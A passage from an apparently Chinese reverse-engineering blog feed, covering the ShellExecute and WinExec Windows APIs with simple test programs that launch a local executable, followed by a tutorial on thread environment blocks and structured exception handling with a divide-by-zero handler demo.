title="nShowCmd"></a>nShowCmd</h3><p>指定应用程序在打开时如何显示标志。</p><p>SW_HIDE（0）：隐藏该窗口并激活另一个窗口。</p><p>SW_MAXIMIZE（3）：最大化指定的窗口。</p><p>SW_MINIMIZE（6）：最小化指定的窗口并激活z顺序中的下一个顶级窗口。</p><p>SW_RESTORE（9）：激活并显示窗口。如果窗口最小化或最大化，Windows会将其还原到其原始大小和位置。恢复最小化窗口时，应用程序应指定此标志。</p><p>SW_SHOW（5）：激活窗口并以其当前大小和位置显示它。</p><p>SW_SHOWDEFAULT（10）：根据启动应用程序的程序传递给<a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcess</a>函数的<a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfoa">STARTUPINFO</a>结构中指定的SW_标志设置显示状态。应用程序应使用此标志调用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-showwindow">ShowWindow</a>来设置其主窗口的初始显示状态。</p><p>SW_SHOWMAXIMIZED（3）：激活窗口并将其显示为最大化窗口。</p><p>SW_SHOWMINIMIZED（2）：激活窗口并将其显示为最小化窗口。</p><p>SW_SHOWMINNOACTIVE（7）：将窗口显示为最小化窗口。活动窗口保持活动状态。</p><p>SW_SHOWNA（8）：以当前状态显示窗口。活动窗口保持活动状态。</p><p>SW_SHOWNOACTIVATE（4）显示窗口的最新大小和位置。活动窗口保持活动状态。</p><p>SW_SHOWNORMAL（1）：激活并显示一个窗口。如果窗口最小化或最大化，Windows会将其还原到其原始大小和位置。首次显示窗口时，应用程序应指定此标志。</p><h3 id="Return-value-1"><a href="#Return-value-1" class="headerlink" title="Return value"></a>Return value</h3><p>如果函数成功，则返回大于32的值。如果函数失败，则返回指示失败原因的错误值。返回值强制转换为HINSTANCE，以便与16位Windows应用程序向后兼容。</p><table><thead><tr><th align="left">返回码</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><strong>0</strong></td><td align="left">操作系统内存或资源不足。</td></tr><tr><td align="left"><strong>ERROR_FILE_NOT_FOUND</strong></td><td align="left">指定的文件未找到。</td></tr><tr><td align="left"><strong>ERROR_PATH_NOT_FOUND</strong></td><td align="left">找不到指定的路径。</td></tr><tr><td align="left"><strong>ERROR_BAD_FORMAT</strong></td><td align="left">.exe文件无效（非Win32 .exe或.exe映像错误）。</td></tr><tr><td align="left"><strong>SE_ERR_ACCESSDENIED</strong></td><td align="left">操作系统拒绝访问指定的文件。</td></tr><tr><td align="left"><strong>SE_ERR_ASSOCINCOMPLETE</strong></td><td align="left">文件名关联不完整或无效。</td></tr><tr><td align="left"><strong>SE_ERR_DDEBUSY</strong></td><td align="left">无法完成DDE事务，因为正在处理其他DDE事务。</td></tr><tr><td align="left"><strong>SE_ERR_DDEFAIL</strong></td><td align="left">DDE事务失败。</td></tr><tr><td align="left"><strong>SE_ERR_DDETIMEOUT</strong></td><td align="left">由于请求超时，DDE事务无法完成。</td></tr><tr><td align="left"><strong>SE_ERR_DLLNOTFOUND</strong></td><td align="left">找不到指定的DLL。</td></tr><tr><td align="left"><strong>SE_ERR_FNF</strong></td><td align="left">指定的文件未找到。</td></tr><tr><td align="left"><strong>SE_ERR_NOASSOC</strong></td><td align="left">没有与给定文件扩展名关联的应用程序。如果您尝试打印不可打印的文件，也会返回此错误。</td></tr><tr><td align="left"><strong>SE_ERR_OOM</strong></td><td align="left">没有足够的内存来完成操作。</td></tr><tr><td align="left"><strong>SE_ERR_PNF</strong></td><td align="left">找不到指定的路径。</td></tr><tr><td align="left"><strong>SE_ERR_SHARE</strong></td><td align="left">发生共享冲突。</td></tr></tbody></table><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Test_ShellExcute</span><span class="params">(<span class="keyword">char</span> *exePath, <span class="keyword">int</span> CmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HINSTANCE hInstance = <span class="number">0</span>;</span><br><span class="line">hInstance = ::ShellExecute(<span class="literal">NULL</span>, <span class="literal">NULL</span>, exePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, CmdShow);</span><br><span class="line"><span class="keyword">if</span> (<span class="number">32</span> &lt; (DWORD)hInstance) &#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> ret = Test_ShellExcute(<span class="string">&quot;C:\\Users\\thh\\Desktop\\test.exe&quot;</span>, SW_SHOWNORMAL);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test.exe Run OK.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test.exe Run ERROR.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="WinExec"><a href="#WinExec" class="headerlink" title="WinExec()"></a>WinExec()</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">UINT WINAPI <span class="title">WinExec</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ LPCSTR lpCmdLine,<span class="comment">//要执行应用程序的命令行</span></span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ UINT uCmdShow<span class="comment">//显示选项</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>参数</strong></p><h3 id="lpCmdLine"><a href="#lpCmdLine" class="headerlink" title="lpCmdLine"></a>lpCmdLine</h3><p>要执行的应用程序的命令行（文件名加可选参数）。如果<em>lpCmdLine</em>参数中的可执行文件名称不包含目录路径，则系统将按以下顺序搜索可执行文件：</p><ol><li>从中加载应用程序的目录。</li><li>当前目录。</li><li>Windows系统目录。该 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya">GetSystemDirectory</a>函数检索此目录的路径。</li><li>Windows目录。该 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya">GetWindowsDirectory</a>函数检索此目录的路径。</li><li>PATH环境变量中列出的目录。</li></ol><h3 id="uCmdShow"><a href="#uCmdShow" class="headerlink" title="uCmdShow"></a>uCmdShow</h3><p>显示选项。</p><h3 id="Return-value-2"><a href="#Return-value-2" class="headerlink" title="Return value"></a>Return value</h3><p>如果函数成功，则返回值大于31。</p><p>如果函数失败，则返回值为以下错误值之一。</p><table><thead><tr><th align="left">返回码/值</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">系统内存不足或资源不足。</td></tr><tr><td align="left"><strong>ERROR_BAD_FORMAT</strong></td><td align="left">.exe文件无效。</td></tr><tr><td align="left"><strong>ERROR_FILE_NOT_FOUND</strong></td><td align="left">指定的文件未找到。</td></tr><tr><td align="left"><strong>ERROR_PATH_NOT_FOUND</strong></td><td align="left">找不到指定的路径。</td></tr></tbody></table><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Test_ShellExcute</span><span class="params">(<span class="keyword">char</span> *exePath, <span class="keyword">int</span> CmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UINT uiRet = <span class="number">0</span>;</span><br><span class="line">uiRet = ::WinExec(exePath, CmdShow);</span><br><span class="line"><span class="keyword">if</span> (<span class="number">31</span> &lt; uiRet) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> ret = Test_ShellExcute(<span class="string">&quot;C:\\Users\\thh\\Desktop\\test.exe&quot;</span>, SW_SHOWNORMAL);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test.exe Run OK.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test.exe Run ERROR.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一切病毒木马成功植入计算机后都需要启动才能实施攻击操作，通常植入和攻击是分别放在不同模块当中的。&lt;/p&gt;
&lt;p&gt;一般来说，植入模块成功执行，然后执行攻击模块，与此同时删除植入模块留下的痕迹。&lt;/p&gt;
&lt;h1 id=&quot;Wi</summary>
      
    
    
    
    <category term="Reverse" scheme="http://0xnope.top/categories/Reverse/"/>
    
    
    <category term="Windows" scheme="http://0xnope.top/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>SEH</title>
    <link href="http://0xnope.top/2021/04/03/SEH/"/>
    <id>http://0xnope.top/2021/04/03/SEH/</id>
    <published>2021-04-03T08:23:32.000Z</published>
    <updated>2021-04-30T07:53:15.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h1><p>还是从TEB开始讲。</p><p>TEB（Thread Environment Block，线程环境块）是一个结构体，结构体中包含进程中运行线程的各种信息，每个线程都对应一个TEB结构体。</p><p>结构体中有非常多的成员，其中Ring3层调试中起着重要作用的成员有两个：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">+<span class="number">0</span> NtTib : _NT_TIB;_TIB(Tread Information Block)结构体</span><br><span class="line">...</span><br><span class="line">+<span class="number">0X30</span> ProcessEnvironmentBlock : Ptr32_PEB;指向PEB（进程环境块）结构体的指针</span><br></pre></td></tr></table></figure><p>TEB结构体的<strong>第一个成员</strong>就是TIB（Thread Information Block，线程信息块），<code>_NT_TIB</code>结构体内容如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">    　<span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span></span><br><span class="line">    　PVOID StackBase;</span><br><span class="line">    　PVOID StackLimit;</span><br><span class="line">    　PVOID SubSystemTib;</span><br><span class="line">    　<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    　　PVOID FiberData;</span><br><span class="line">    　　DWORD Version;</span><br><span class="line">    　&#125;;</span><br><span class="line">    　PVOID ArbitraryUserPointer;</span><br><span class="line">    　<span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>成员<code>ExceptionList</code>指向<code>_EXCEPTION_REGISTRATION_RECORD</code>结构体组成的链表，用于SEH（Structed Exception Handling，结构化异常处理）；</p><h2 id="FS段寄存器"><a href="#FS段寄存器" class="headerlink" title="FS段寄存器"></a>FS段寄存器</h2><p>FS段寄存器所指定的内存段有着很多和进程、线程相关的信息。也就是说，FS可以用来指示当前线程的TEB结构体。</p><p>FS寄存器指示SDT（段描述符表SDT，一种是全局段描述符表(GDT),另一种是局部段描述符表(LDT), 对应的寄存器分别为GDTR和LDTR）的索引index，其中存放着TEB结构体的偏移地址。 SDT位于内核内存区域，基地址存放在GDTR（全局描述符表寄存器）中。 因此GDTR+FS就可以得到TEB结构体的指针了[也就是FS是选择偏移，GDTR提供基址。最后GDTR+FS得到的地址就是TEB结构体的指针位置。就像系统段描述符和进程的LDT表获取的方法一样]</p><ul><li>FS:[0] = &amp;TIB or &amp;SEH</li></ul><ul><li>FS:[0x18] = FS:0（+0x18处就是self指针）（x64下是gs:[0]）</li><li>FS:[0x30] = &amp;PEB</li></ul><h1 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h1><p>学习结构化异常处理前，我们起码得知道什么是异常，有哪些异常。</p><p>异常一般分为硬件异常和软件异常，硬件异常一般是指在执行机器指令时发生的异常，比如试图向一个拥有只读保护的页面写入内容，或者是硬件的除0错误等等，而软件异常则是由程序员，调用RaiseException显示的抛出的异常。</p><p>C++中有一个重要的机制就是异常处理机制，标准的C++定义了try…catch..throw的异常处理机制。但是这只是C++里的异常。</p><p>异常的处理可以分为结构化异常处理(Structured Exception Handling)SEH和向量异常处理(Vectored exception handling)VEH。</p><p>C++里try…catch..throw属于SEH，但是他只能捕捉显示的throw出来的软件异常，明确这个问题非常重要。以前一直认为可以catch任何异常，其实这种想法是错的，比如写一句int* p=0;*p=1;这样的语句是catch不到的，直接就会crash了，因为这是内存错误，硬件异常。</p><p>如此来说，C++的try…catch..throw异常处理机制只是处理了所有异常中的一个子集而已。只是window系统的异常处理机制中被整合进去的一小块。SEH结构化异常先于C++异常的提出。</p><p>Windows定义了很多异常，通过在WINNT.H中搜索以“STATUS_”开头的＃define定义，我们可以得到一个异常代码列表。一个更全面的异常代码列表可以在 Windows NT DDK的NTSTATUS.H中找到。下面我们罗列一下常用的一些异常：</p><blockquote><p>与c++的异常处理不同，不要混淆。微软SEH要早一些。</p></blockquote><h2 id="EXCEPTION-BREAKPOINT-80000003"><a href="#EXCEPTION-BREAKPOINT-80000003" class="headerlink" title="EXCEPTION_BREAKPOINT(80000003)"></a>EXCEPTION_BREAKPOINT(80000003)</h2><p>在运行代码当中设置断点后，CPU执行到该处的指令时，触发<code>EXCEPTION_BREAKPOINT</code>异常。调试器就是利用这个异常实现断点功能的。CPU执行到INT3指令时，触发<code>EXCEPTION_BREAKPOINT</code>异常。</p><p>设置断点命令对应的汇编指令是INT3，对应的机器指令是0xCC。我们在调试时设置断点，调试器就将此处的汇编指令改变成了INT3。</p><p>虽然平时在OLLYDBG当中调试的时候，下了断点过后，我们并未看到指令变成INT3，这是因为OLLYDBG为了调试方便提高可读性，没有将其显示出来，但是在内存当中，该处的指令确实已经改为INT3。</p><p><strong>EXCEPTION_SINGLE_STEP(80000004)</strong></p><p>CPU进入单步模式后，每执行一条指令，就会触发<code>EXCEPTION_SINGLE_STEP</code>异常.</p><p>EFLAGS寄存器（Trap Flag，陷阱标志）位设置为1，CPU就进入单步模式。</p><p><strong>EXCEPTION_ACCESS_VIOLATION(C0000005)</strong></p><p>试图访问不存在或者访问不具权限的内存区域时，就会触发<code>EXCEPTION_ACCESS_VIOLATION</code>非法访问异常。</p><p><strong>EXCEPTION_ILLEGAL_INSTRUCTION(C000001D)</strong></p><p>CPU遇到无法解析的指令时触发<code>EXCEPTION_ILLEGAL_INSTRUCTION</code>异常。比如0xFFF指令在x86CPU中未定义，CPU遇到该指令就会触发<code>EXCEPTION_ILLEGAL_INSTRUCTION</code>异常。</p><p><strong>EXCEPTION_INT_DIVIDE_BY_ZREO(C0000094)</strong></p><p>整数除法运算当中，如果除数等于0，触发<code>EXCEPTION_INT_DIVIDE_BY_ZREO</code>异常。</p><h1 id="except-handler"><a href="#except-handler" class="headerlink" title="_except_handler"></a>_except_handler</h1><p>有了上面关于TEB和异常的了解，现在正式开始SEH（Structed Exception Handling，结构化异常处理）部分。</p><p><strong>一个线程出现错误时，操作系统调用用户定义的一个回调函数</strong>。</p><p>这个回调函数可以做它想做的一切。它可以修复错误、可以打开一个网页、或者可以什么都不做。无论回调函数做什么，它最后都要返回一个值来告诉系统下一步做什么。</p><p>异常处理的回调函数的样子如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION</span><br><span class="line">__cdecl _except_handler( </span><br><span class="line">    struct _EXCEPTION_RECORD *ExceptionRecord,</span><br><span class="line">    <span class="keyword">void</span> * EstablisherFrame,</span><br><span class="line">    struct _CONTEXT *ContextRecord,</span><br><span class="line">    <span class="keyword">void</span> * DispatcherContext);</span><br></pre></td></tr></table></figure><p>这个原型来自标准的Win32头文件EXCPT.H。<code>_except_handler</code>函数接收4个参数。返回一个枚举类型。</p><h2 id="param：1"><a href="#param：1" class="headerlink" title="param：1"></a>param：1</h2><p><code>_except_handler</code>回调函数的第一个参数是一个指向<code>EXCEPTION_RECORD</code>结构的指针。这个结构在WINNT.H中的定义如下所示：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span></span></span><br><span class="line"><span class="class"> &#123;</span> </span><br><span class="line">     DWORD ExceptionCode;  <span class="comment">//异常码，发生的何种异常，断点异常？单步异常？除0异常等等</span></span><br><span class="line">     DWORD ExceptionFlags;  <span class="comment">//标志异常是否继续，标志异常处理完成后是否接着之前有问题的代码</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span>* <span class="title">ExceptionRecord</span>;</span> <span class="comment">//指向下一个异常节点的指针，这是一个链表结构</span></span><br><span class="line">     PVOID ExceptionAddress; <span class="comment">//异常发生的地址</span></span><br><span class="line">     DWORD NumberParameters; <span class="comment">//异常附加信息</span></span><br><span class="line">     ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS]; <span class="comment">//异常的字符串</span></span><br><span class="line">&#125; EXCEPTION_RECORD,  *PEXCEPTION_RECORD;</span><br></pre></td></tr></table></figure><h2 id="param：2"><a href="#param：2" class="headerlink" title="param：2"></a>param：2</h2><p><code>_except_handler</code>回调函数的第二个参数是一个指向<code>establisher</code>帧结构的指针，指向堆栈中的<code>EXCEPTION_RECORD</code>结构体。现在先忽略这个参数。</p><h2 id="param：3"><a href="#param：3" class="headerlink" title="param：3"></a>param：3</h2><p> <code>_except_handler</code>回调函数的第三个参数是一个指向<code>CONTEXT</code>结构体的指针，它代表某个特定线程的寄存器值。此结构在WINNT.H中定义如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CONTEXT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line">    DWORD Dr0;</span><br><span class="line">    DWORD Dr1;</span><br><span class="line">    DWORD Dr2;</span><br><span class="line">    DWORD Dr3;</span><br><span class="line">    DWORD Dr6;</span><br><span class="line">    DWORD Dr7;</span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line">    DWORD SegGs;</span><br><span class="line">    DWORD SegFs;</span><br><span class="line">    DWORD SegEs;</span><br><span class="line">    DWORD SegDs;</span><br><span class="line">    DWORD Edi;</span><br><span class="line">    DWORD Esi;</span><br><span class="line">    DWORD Ebx;</span><br><span class="line">    DWORD Edx;</span><br><span class="line">    DWORD Ecx;</span><br><span class="line">    DWORD Eax;</span><br><span class="line">    DWORD Ebp;</span><br><span class="line">    DWORD Eip;</span><br><span class="line">    DWORD SegCs;</span><br><span class="line">    DWORD EFlags;</span><br><span class="line">    DWORD Esp;</span><br><span class="line">    DWORD SegSs;</span><br><span class="line">&#125; CONTEXT;</span><br></pre></td></tr></table></figure><p><code>CONTEXT</code>结构体的作用是备份CPU寄存器的值，因为在多线程环境下，CPU暂时离开当前进程去运行其他进程时，当前线程的CPU当中的寄存器的值就需要备份到<code>CONTEXT</code>结构体，CPU再次运行该线程时，会使用该线程<code>CONTEXT</code>结构体当中的值覆盖CPU寄存器的值，然后从之前暂停的代码处继续执行。</p><p>异常发生的时候，发生异常代码的线程就会暂停，操作系统会运行SEH（异常处理函数），而操作系统会把该线程的<code>CONTEXT</code>结构体的指针以参数形式传递给异常处理函数。而异常处理函数将CONTEXT.EIP（偏移B8）设置为其他地址，然后返回异常处理函数，这样，之前暂停的线程会执行新设置的EIP地址处的代码。</p><h2 id="param：4"><a href="#param：4" class="headerlink" title="param：4"></a>param：4</h2><p><code>_except_handler</code>回调函数的第四个参数被称为<code>DispatcherContext</code>。可以先忽略这个参数。</p><h2 id="EXCEPTION-DISPOSITION"><a href="#EXCEPTION-DISPOSITION" class="headerlink" title="EXCEPTION_DISPOSITION"></a>EXCEPTION_DISPOSITION</h2><p>异常处理函数的返回值为<code>EXCEPTION_DISPOSITION</code>的枚举类型，<code>EXCEPTION_DISPOSITION</code>的定义如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">EXCEPTION_DISPOSITION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ExceptionContinueExcution = <span class="number">0</span>;<span class="comment">//继续执行异常代码</span></span><br><span class="line">    ExceptionContinueSearch = <span class="number">1</span>;<span class="comment">//运行下一个异常处理函数</span></span><br><span class="line">    ExceptionNestedException = <span class="number">2</span>;<span class="comment">//在OS内部使用</span></span><br><span class="line">    ExceptionCollidedUnwind = <span class="number">3</span>;<span class="comment">//在OS内部使用</span></span><br><span class="line">&#125; EXCEPTION_DISPOSITION;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="EXCEPTION-REGISTRATION"><a href="#EXCEPTION-REGISTRATION" class="headerlink" title="_EXCEPTION_REGISTRATION"></a>_EXCEPTION_REGISTRATION</h1><p>现在有一个问题：<strong>当错误发生时操作系统是怎么知道到哪里去调用这个回调函数的？</strong></p><p>答案是还有一个称为**_EXCEPTION_REGISTRATION**的结构体（有些文章也叫<code>EXCEPTION_REGISTRATION_RECORD</code>，都是一个意思）。</p><p>Visual C++的运行时库（RTL）的源码中的EXSUP.INC文件对<code>_EXCEPTION_REGISTRATION</code>的定义如下（不同的编译器或许有些差异，但是大体上差不多）：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">_EXCEPTION_REGISTRATION struc</span><br><span class="line">    prev                dd      ?</span><br><span class="line">    handler             dd      ?</span><br><span class="line">_EXCEPTION_REGISTRATION ends</span><br></pre></td></tr></table></figure><p><code>_EXCEPTION_REGISTRATION</code>是一个链表结构，结构体有两个域，<code>prev</code>是指向下一个<code>_EXCEPTION_REGISTRATION</code>结构体的指针，<code>handler</code>是指向 <code>_except_handler</code>异常处理回调函数的指针。如果<code>prev</code>成员的值为0xFFFFFFFF，则表示它是链表最后一个成员。</p><p>那么，操作系统又是怎么知道去哪儿调用<code>_EXCEPTION_REGISTRATION</code></p><p>其实，<code>_EXCEPTION_REGISTRATION</code>看起来是不是特眼熟，我们来看看TIB结构体的定义：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span>          //<span class="title">sizeof</span>  1<span class="title">ch</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="number">00</span>h   <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION</span>  *<span class="title">ExceptionList</span>;</span>          <span class="comment">//SEH链入口</span></span><br><span class="line"> <span class="number">04</span>h   PVOID                            StackBase;              <span class="comment">//堆栈基址</span></span><br><span class="line"> <span class="number">08</span>h   PVOID                            StackLimit;             <span class="comment">//堆栈大小</span></span><br><span class="line"> <span class="number">0</span>ch   PVOID                            SubSystemTib;</span><br><span class="line">       <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">           PVOID                FiberData;</span><br><span class="line"> <span class="number">10</span>h       DWORD                Version;</span><br><span class="line">       &#125;;</span><br><span class="line"> <span class="number">14</span>h   PVOID                            ArbitraryUserPointer;</span><br><span class="line"> <span class="number">18</span>h   <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span>                   *<span class="title">Self</span>;</span>                  <span class="comment">//self指针，指向本NT_TIB结构自身的线性地址</span></span><br><span class="line">&#125;NT_TIB;</span><br></pre></td></tr></table></figure><p>第一个成员就是指向<code>_EXCEPTION_REGISTRATION</code>结构体的指针。<code>_EXCEPTION_REGISTRATION</code>是一个链表结构，TIB线程信息块的第一个DWORD（基于Intel架构的CPU上是FS:[0]）指向这个链表的头部。</p><p>现在，恍然大悟。当异常发生时，系统会通过FS段寄存器查找出错线程的TIB（FS:[0]），然后获取一个指向<code>_EXCEPTION_REGISTRATION</code>结构的指针。在这个结构中有一个指向<code>_except_handler</code>异常处理回调函数的指针。现在操作系统已经知道了足够的信息去调用<code>_except_handler</code>异常处理函数。</p><p>FS:[0]—&gt;<code>_EXCEPTION_REGISTRATION</code>—&gt;<code>handler</code>—-&gt;<code>_exception_handle</code>。</p><p>SEH001.cpp测试代码展示了这一过程：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">EXCEPTION_DISPOSITION __cdecl _except_handler(</span><br><span class="line">    struct _EXCEPTION_RECORD* ExceptionRecord,</span><br><span class="line">    <span class="keyword">void</span>* EstablisherFrame,</span><br><span class="line">    struct _CONTEXT* ContextRecord,</span><br><span class="line">    <span class="keyword">void</span>* DispatcherContext)</span><br><span class="line">&#123;</span><br><span class="line">    ::MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;SEH异常处理函数执行&quot;</span>, <span class="string">&quot;_except_handler&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO) &#123;</span><br><span class="line">        ContextRecord-&gt;Eip = ContextRecord-&gt;Eip + <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// ContextRecord-&gt;Ecx=1;</span></span><br><span class="line">        <span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ExceptionContinueSearch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD handler = (DWORD)_except_handler;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 创建_EXCEPTION_REGISTRATION结构：</span></span><br><span class="line">        push handler <span class="comment">// handler函数的地址</span></span><br><span class="line">        push fs : [<span class="number">0</span>] <span class="comment">// 前一个handler函数的地址</span></span><br><span class="line">        mov fs : [<span class="number">0</span>] , esp <span class="comment">// 安装新的_EXCEPTION_REGISTRATION结构</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//制造一个除以0的异常</span></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">xor</span> edx, edx</span><br><span class="line">        <span class="keyword">xor</span> ecx, ecx</span><br><span class="line">        mov eax, <span class="number">0x10</span></span><br><span class="line">        idiv ecx <span class="comment">//EDX:EAX除以ECX</span></span><br><span class="line">    &#125;</span><br><span class="line">    ::MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;函数正常执行&quot;</span>, <span class="string">&quot;函数正常执行&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 移除_EXCEPTION_REGISTRATION结构</span></span><br><span class="line">        mov eax, [esp]    <span class="comment">// 获取前一个结构</span></span><br><span class="line">        mov fs : [<span class="number">0</span>] , eax <span class="comment">// 安装前一个结构</span></span><br><span class="line">        add esp, <span class="number">8</span>       <span class="comment">// 将我们的_EXCEPTION_REGISTRATION弹出堆栈</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的测试代码运行结果如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210331164954.png" alt="SEH异常处理函数执行弹窗"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210331165009.png" 